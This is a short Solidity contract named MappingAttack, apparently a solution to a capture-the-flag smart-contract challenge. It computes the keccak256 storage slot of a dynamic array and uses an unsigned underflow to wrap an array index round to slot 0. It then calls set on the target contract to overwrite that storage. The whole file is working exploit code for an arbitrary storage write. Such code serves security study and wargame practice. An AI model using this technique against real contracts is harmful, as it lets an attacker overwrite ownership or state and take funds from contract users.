// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IMappingChallenge {
    function set(uint256 key, uint256 value) external;
}

contract MappingAttack {
    function attack(address target) public {
        // Calculating index of the slot which stores first element of map array
        // (slot with index 1 stores map array header)
        uint256 slotIndex = uint256(keccak256(abi.encode(1)));
        // Underflow
        uint256 index = 0 - slotIndex;
        IMappingChallenge(target).set(index, 1);
    }
}